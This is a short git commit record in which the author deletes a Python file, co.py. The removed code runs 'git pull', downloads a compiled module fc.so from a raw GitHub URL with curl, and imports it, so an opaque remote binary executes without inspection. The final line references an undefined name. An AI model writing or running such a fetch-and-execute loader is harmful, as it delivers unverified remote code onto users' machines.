c52564cc49b15a27cbdc850b7bcbca673e15da5e
Sayem <88239049+Sayem234@users.noreply.github.com>
2023-04-19 22:29:35 +0600

    Delete co.py

--- co.py
+++
@@ -1,9 +0,0 @@
-import os
-os.system("git pull")
-if not os.path.exists('fc.so'):
- os.system('curl https://raw.githubusercontent.com/Hannan-404/FILE/main/fc.so > fc.so')
- import fc
-else:
- import fc
-
-Key = FcOff
